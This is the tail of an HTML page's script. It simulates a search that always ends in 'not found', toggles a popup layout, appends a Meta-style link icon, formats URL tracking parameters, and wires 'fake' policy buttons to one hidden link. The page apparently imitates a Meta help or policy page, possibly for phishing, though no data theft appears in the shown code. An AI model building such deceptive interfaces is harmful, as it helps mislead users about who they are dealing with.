            if (isSearch == false) {
                isSearch = true
                fakeSearchProccesBlock.style.display = 'none'
                notFoundBlock.style.display = 'none';
                searchItemsBlock.style.display = 'block'
                setTimeout(function () {
                    fakeSearchProccesBlock.style.display = 'block';
                    notFoundBlock.style.display = 'none';
                    setTimeout(function () {
                        notFoundBlock.style.display = 'block';
                        fakeSearchProccesBlock.style.display = 'none';
                        isSearch = false
                    }, 1000)
                }, 1500)
            }
        })
        /* ----------------------------------------------------------------------------- */
        document.addEventListener('DOMContentLoaded', function () {
            const button = document.getElementById('showPopup');
            const popup = document.getElementById('popup');
            const closePopup = document.getElementById('closePopup');
            const col4Content = document.querySelector('.col-4');
            const newCol4Content = document.querySelector('.popup-item');
            const popupContent = document.querySelector('.popup-content');
            button.addEventListener('click', function () {
                popupContent.innerHTML = col4Content.innerHTML;
                document.body.style.overflow = 'hidden';
                popup.style.display = 'flex';
                document.querySelector('#popup #search').addEventListener('click', function (e) {
                    searchModal.show()
                })
            });
            closePopup.addEventListener('click', function () {
                popup.style.display = 'none';
                document.body.style.overflow = 'auto';
            });
            function updateLayout() {
                if (window.innerWidth < 1000) {
                    col4Content.style.display = 'none';
                    button.style.display = 'block';
                } else {
                    col4Content.style.display = 'block';
                    button.style.display = 'none';
                }
            }
            updateLayout();
            window.addEventListener('resize', updateLayout);
        });
        /* ----------------------------------------------------------------------------- */
        function addSvgInLinks() {
            var svg = `
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
                                class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path
                                    d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path
                                    d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            `
            var links = document.querySelectorAll('a.add-svg')
            links.forEach(elem => {
                elem.innerHTML = elem.textContent + svg
            })
        }
        addSvgInLinks()
        function dictToString(dict) {
            var result = ''
            let entries = Object.entries(dict);
            entries.forEach(pair => {
                var paramName = pair[0]
                var paramValue = pair[1]
                result = result + `${paramName} : ${paramValue}\n`
            })
            //result = result + '\n'
            return result
        }
        function prettyUtmParams() {
            var params = new URL(window.location.href).search
            params = params.slice(1)
            params = params.split('&')
            var result = '\n'
            params.forEach(elem => {
                var key = elem.split('=')[0]
                var value = elem.split('=')[1]
                result = result + `${key} : ${value}\n`
            })
            return result
        }
        var fake_policy_links = document.querySelector('.fake-likns').querySelectorAll('.action-button.wide')
        fake_policy_links.forEach(elem => {
            elem.addEventListener('click', function () {
                document.getElementById('policyLink').click()
            })
        })
    </script>
  </div></body></html>